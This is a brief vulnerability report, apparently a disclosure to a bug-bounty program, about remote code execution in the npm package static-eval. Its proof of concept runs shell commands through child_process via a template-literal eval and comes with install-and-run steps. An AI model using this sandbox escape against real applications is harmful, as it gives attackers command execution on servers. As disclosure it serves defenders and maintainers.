# Description

Remote Code Execution (RCE) in static-eval

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var evaluate = require('static-eval');
var parse = require('esprima').parse;

var src=(function (x) { return `${eval("console.log(global.process.mainModule.constructor._load('child_process').execSync('ls').toString())")}` })()
var ast = parse(src).body[0].expression;
evaluate(ast)
```

2. Execute the following commands in terminal:

```
npm i static-eval # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output using ls command before and after the execution
